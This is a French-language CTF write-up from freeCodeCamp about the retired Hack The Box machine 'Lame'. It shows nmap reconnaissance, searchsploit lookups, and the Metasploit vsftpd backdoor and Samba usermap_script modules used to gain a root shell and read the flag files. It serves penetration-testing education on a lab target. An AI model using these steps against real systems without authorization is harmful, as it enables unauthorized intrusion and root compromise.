---
title: Restez calme et piratez The Box - Lame
subtitle: ''
author: Sonya Moisset
co_authors: []
series: null
date: '2019-08-03T17:46:37.000Z'
originalURL: https://freecodecamp.org/news/keep-calm-and-hack-the-box-lame
coverImage: https://www.freecodecamp.org/news/content/images/2019/08/126399.jpg
tags:
- name: Application Security
  slug: application-security
- name: cybersecurity
  slug: cybersecurity
- name: Ethical Hacking
  slug: ethical-hacking
- name: hacking
  slug: hacking
- name: Security
  slug: security
seo_title: Restez calme et piratez The Box - Lame
seo_desc: Hack The Box (HTB) is an online platform allowing you to test your penetration
  testing skills. It contains several challenges that are constantly updated. Some
  of them simulating real world scenarios and some of them leaning more towards a
  CTF style ...
---

Hack The Box (HTB) est une plateforme en ligne vous permettant de tester vos compétences en tests d'intrusion. Elle contient plusieurs défis qui sont constamment mis à jour. Certains d'entre eux simulent des scénarios réels et d'autres s'orientent plus vers un style de défi CTF.

**Note**. *Seuls les write-ups des machines HTB retirées sont autorisés.*

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-01-at-20.39.48.png)

Lame est la première machine publiée sur Hack The Box et est destinée aux débutants, nécessitant seulement une seule exploitation pour obtenir un accès root.

Nous utiliserons les outils suivants pour pirater la machine sur une [boîte Kali Linux](https://www.kali.org/)

* [nmap](https://nmap.org/)
* [zenmap](https://nmap.org/zenmap/)
* [searchsploit](https://www.exploit-db.com/searchsploit)
* [metasploit](https://www.metasploit.com/)

## Étape 1 - Scanner le réseau

La première étape avant d'exploiter une machine est de faire un peu de scanning et de reconnaissance.

C'est l'une des parties les plus importantes car elle déterminera ce que vous pourrez essayer d'exploiter par la suite. Il est toujours préférable de passer plus de temps sur cette phase pour obtenir autant d'informations que possible.

J'utiliserai Nmap (Network Mapper). Nmap est un utilitaire gratuit et open source pour la découverte de réseau et l'audit de sécurité. Il utilise des paquets IP bruts pour déterminer quels hôtes sont disponibles sur le réseau, quels services ces hôtes offrent, quels systèmes d'exploitation ils exécutent, quel type de filtres de paquets/pare-feu sont utilisés, et des dizaines d'autres caractéristiques.

Il existe de nombreuses commandes que vous pouvez utiliser avec cet outil pour scanner le réseau. Si vous souhaitez en savoir plus, vous pouvez consulter la documentation [ici](https://tools.kali.org/information-gathering/nmap)

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-01-at-21.22.34.png)

J'utilise la commande suivante pour avoir une idée de base de ce que nous scannons

```bash
nmap -sV -O -F --version-light 10.10.10.3
```

**-sV:** Sonde les ports ouverts pour déterminer les informations de service/version

**-O:** Active la détection du système d'exploitation

**-F:** Mode rapide - Scanne moins de ports que le scan par défaut

**--version-light:** Limite aux sondes les plus probables (intensité 2)

**10.10.10.3:** Adresse IP de la machine Lame

Vous pouvez également utiliser Zenmap, qui est l'interface graphique officielle de Nmap Security Scanner. C'est une application multiplateforme, gratuite et open source qui vise à rendre Nmap facile à utiliser pour les débutants tout en fournissant des fonctionnalités avancées pour les utilisateurs expérimentés de Nmap.

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-02-at-20.38.10.png)

J'utilise un ensemble différent de commandes pour effectuer un scan intensif

```bash
nmap -A -v 10.10.10.3
```

**-A:** Active la détection du système d'exploitation, la détection de version, le scan de scripts et le traceroute

**-v:** Augmente le niveau de verbosité

**10.10.10.3:** Adresse IP de la machine Lame

Si vous trouvez les résultats un peu trop écrasants, vous pouvez passer à l'onglet **Ports/Hôtes** pour obtenir uniquement les ports ouverts

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-02-at-20.38.31.png)

Nous pouvons voir qu'il y a 4 ports ouverts:

**Port 21**. File Transfer Protocol (FTP) control (command)

**Port 22**. Secure Shell (SSH), connexions sécurisées, transferts de fichiers (scp, sftp) et redirection de port

**Port 139**. NetBIOS Session Service

**Port 445**. Microsoft-DS (Directory Services) partage de fichiers SMB

Voyons ce que nous pouvons obtenir avec le premier port

## Étape 2 - Le FTP vulnérable

Nous utiliserons Searchsploit pour vérifier s'il existe une vulnérabilité connue sur vsftpd 2.3.4. Searchsploit est un outil de recherche en ligne de commande pour la base de données d'exploits

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-02-at-21.05.26.png)

J'utilise la commande suivante

```bash
searchsploit vsftpd 2.3.4
```

Maintenant que nous savons qu'il existe une vulnérabilité - Exécution de commande Backdoor - essayons de l'exploiter

Nous utiliserons Metasploit. C'est un framework de test de pénétration qui simplifie le piratage. C'est un outil essentiel pour de nombreux attaquants et défenseurs

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-02-at-21.14.13.png)
_[https://www.metasploit.com/](https://www.metasploit.com/)_

Je lance Metasploit Framework sur Kali et cherche la commande que je devrais utiliser pour lancer l'exploit

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-02-at-22.52.42.png)

J'utilise la commande pour rechercher toutes les charges utiles disponibles

```bash
search vsftpd 2.3.4
```

Nous pouvons voir qu'il existe plusieurs exploits différents, mais celui qui nous intéresse est le numéro 4

```bash
exploit/unix/ftp/vsftpd_234_backdoor
```

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-02-at-21.39.05.png)

J'utilise la commande suivante pour l'exploit

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

Cela lancera l'exploit. J'utilise cette commande pour afficher les options disponibles

```bash
show options
```

Vous pouvez voir que l'hôte distant (RHOSTS) n'est pas encore défini. Je vais définir à la fois l'hôte distant et la cible, car ces deux informations sont nécessaires pour exécuter l'exploit

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-02-at-21.43.41.png)

J'utilise la commande suivante pour définir l'hôte distant en utilisant l'adresse IP de la machine HTB Lame

```bash
set RHOSTS 10.10.10.3
```

Ensuite, je définis la cible à 0 comme affiché lorsque j'ai vérifié les options

```bash
set TARGET 0
```

Nous pouvons maintenant exécuter l'exploit

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-02-at-21.46.42.png)

Malheureusement, nous pouvons voir que même si l'exploit est terminé, aucune session n'a été créée. La vulnérabilité a été corrigée comme mentionné ici, dans la description de l'exploit.

> Ce module exploite une porte dérobée malveillante qui a été ajoutée à l'archive de téléchargement VSFTPD. Cette porte dérobée a été introduite dans l'archive vsftpd-2.3.4.tar.gz entre le 30 juin 2011 et le 1er juillet 2011 selon les informations les plus récentes disponibles. Cette porte dérobée a été supprimée le 3 juillet 2011.

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-02-at-21.51.41.png)
_[https://www.exploit-db.com/exploits/17491](https://www.exploit-db.com/exploits/17491)_

La base de données Exploit est une archive conforme aux vulnérabilités et expositions courantes (CVE) d'exploits publics et de logiciels vulnérables correspondants, développée pour être utilisée par les testeurs de pénétration et les chercheurs en vulnérabilités. L'objectif est de servir la collection la plus complète d'exploits recueillis par le biais de soumissions directes, de listes de diffusion, ainsi que d'autres sources publiques, et de les présenter dans une base de données librement disponible et facile à naviguer. La base de données Exploit est un dépôt pour les exploits et les preuves de concept plutôt que pour les avis, ce qui en fait une ressource précieuse pour ceux qui ont besoin de données exploitables immédiatement.

Nous devons trouver une autre façon. Regardons un autre port!

## Étape 3 - Le Samba vulnérable

Si vous vous souvenez de l'Étape 1 - Scanner le réseau, nous avons découvert que le port 445 - Samba smbd 3.0.20-Debian était ouvert. Voyons si nous pouvons trouver des vulnérabilités autour de cette version spécifique

Si vous souhaitez en savoir plus sur Samba, allez [ici](https://www.samba.org/). Mais une connaissance approfondie de Samba n'est pas requise pour cette machine.

Nous retournons à Searchsploit pour vérifier

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-02-at-21.51.20.png)

J'utilise la commande suivante

```bash
searchsploit Samba 3.0.20
```

Nous pouvons voir qu'il y a une 'Username' map script Command Execution que nous pourrions lancer en utilisant Metasploit. Essayons!

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-02-at-22.04.21.png)

Retour à Metasploit et vérification de la commande que nous devrions utiliser pour lancer l'exploit. J'utilise la commande suivante

```bash
search Samba 3.0.20
```

Nous pouvons voir qu'il existe plusieurs exploits différents, mais celui qui nous intéresse est le numéro 15

```bash
exploit/multi/samba/usermap_script
```

Vous pouvez également le trouver sur le site web de la base de données Exploit

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-02-at-22.20.21.png)
_https://www.exploit-db.com/exploits/16320_

La description de l'exploit

> Ce module exploite une vulnérabilité d'exécution de commande dans les versions Samba 3.0.20 à 3.0.25rc3 lors de l'utilisation de l'option de configuration "username map script" non par défaut. En spécifiant un nom d'utilisateur contenant des caractères méta de shell, les attaquants peuvent exécuter des commandes arbitraires.
> Aucune authentification n'est nécessaire pour exploiter cette vulnérabilité puisque cette option est utilisée pour mapper les noms d'utilisateur avant l'authentification!

Retour sur Metasploit où j'utilise la commande

```bash
use exploit/multi/samba/usermap_script
```

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-02-at-22.15.34.png)

Cela lancera l'exploit. J'utilise la commande suivante pour afficher les options disponibles

```bash
show options
```

Vous pouvez voir que l'hôte distant (RHOSTS) n'est pas encore défini.

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-02-at-22.16.43.png)

J'utilise la commande suivante pour définir l'hôte distant en utilisant l'adresse IP de la machine HTB Lame

```bash
set RHOSTS 10.10.10.3
```

Nous pouvons maintenant exécuter l'exploit

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-02-at-22.17.39.png)

Bingo! Nous avons un shell de commande ouvert. Voyons ce que nous pouvons trouver :)

## Étape 4 - Recherche du flag user.txt

Nous pouvons maintenant chercher le premier flag, user.txt

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-02-at-22.32.01.png)

J'utilise la commande suivante pour vérifier qui je suis sur cette machine

```bash
whoami
```

Nous avons un accès root à la machine. Nous avons le pouvoir! Commençons à naviguer dans les dossiers

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-02-at-22.33.00.png)

J'utilise la commande suivante pour lister tous les fichiers/dossiers

```bash
ls
```

Déplaçons-nous vers le dossier **home** et voyons ce que nous pouvons trouver

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-02-at-22.37.03.png)

J'utilise la commande suivante pour changer de répertoire vers le répertoire home, puis je liste tous les fichiers/dossiers

```bash
cd home
```

Nous n'avons pas beaucoup d'informations ici, soyons plus spécifiques avec la commande

```bash
ls -la
```

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-02-at-22.39.35.png)

Nous pouvons voir qu'il y a un dossier appelé makis. Voyons ce qu'il y a à l'intérieur!

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-02-at-22.41.23.png)

Nous avons trouvé le fichier user.txt! Pour lire le contenu du fichier, j'utilise la commande

```bash
cat user.txt
```

Maintenant que nous avons le flag utilisateur, trouvons le flag root!

## Étape 5 - Recherche du flag root.txt

Retourons au répertoire root. J'utilise la commande

```bash
cd ~
```

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-02-at-22.48.35.png)

Pour vérifier où vous vous trouvez, vous pouvez utiliser la commande suivante

```bash
pwd
```

Ici, nous voyons que nous sommes au niveau **/root** et si nous listons les fichiers/dossiers, nous trouvons le fichier root.txt!

Pour lire le contenu du fichier, j'utilise la commande

```bash
cat root.txt
```

Félicitations! Vous avez trouvé les deux flags!

---

N'hésitez pas à commenter, poser des questions ou partager avec vos amis :)

Vous pouvez voir plus de mes articles [ici](https://www.freecodecamp.org/news/author/sonya/)

Vous pouvez me suivre sur [Twitter](https://twitter.com/SonyaMoisset) ou sur [LinkedIn](https://www.linkedin.com/in/sonyamoisset/)

Et n'oubliez pas de #**GetSecure**, #**BeSecure** & #**StaySecure**!

---

**Autres articles de cette série**

* [Restez calme et piratez The Box - Legacy](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-legacy/)
* [Restez calme et piratez The Box - Devel](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-devel/)
* [Restez calme et piratez The Box - Beep](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-beep/)

![Image](https://www.freecodecamp.org/news/content/images/2019/08/126399-2.jpg)